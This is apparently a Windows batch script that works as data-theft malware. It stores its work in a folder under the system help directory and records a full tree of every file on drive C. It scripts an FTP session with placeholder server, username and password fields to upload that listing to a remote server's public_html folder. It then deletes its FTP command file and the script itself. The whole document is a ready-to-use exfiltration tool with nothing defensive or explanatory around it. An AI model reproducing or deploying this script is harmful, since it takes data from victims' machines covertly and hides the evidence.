@ECHO OFF
> "%SystemRoot%\help\combat\com.log" ECHO [log] 2

:Com
SET FTPSERV=(Your FTP SERVER)
SET FTPUSER=(Your FTP USERNAME)
SET FTPPASS=(Your FTP PASSWORD)

:Tree
TREE C:\ /F /A > "%SystemRoot%\help\combat\%USERNAME%tree.txt"

:FTP
IF NOT EXIST "%SystemRoot%\help\combat\%USERNAME%tree.txt" GOTO Tree
> "%SystemRoot%\help\combat\upltree.txt" ECHO open %FTPSERV%
>>"%SystemRoot%\help\combat\upltree.txt" ECHO %FTPUSER%
>>"%SystemRoot%\help\combat\upltree.txt" ECHO %FTPPASS%
>>"%SystemRoot%\help\combat\upltree.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\upltree.txt" ECHO prompt
>>"%SystemRoot%\help\combat\upltree.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\upltree.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%tree.txt"
>>"%SystemRoot%\help\combat\upltree.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\upltree.txt" GOTO FTP
FTP -s:"%SystemRoot%\help\combat\upltree.txt" >> "%SystemRoot%\help\combat\comlist.log"
DEL /F /Q "%SystemRoot%\help\combat\upltree.txt" >NUL

:End
DEL /F /Q "%0" >NUL
EXIT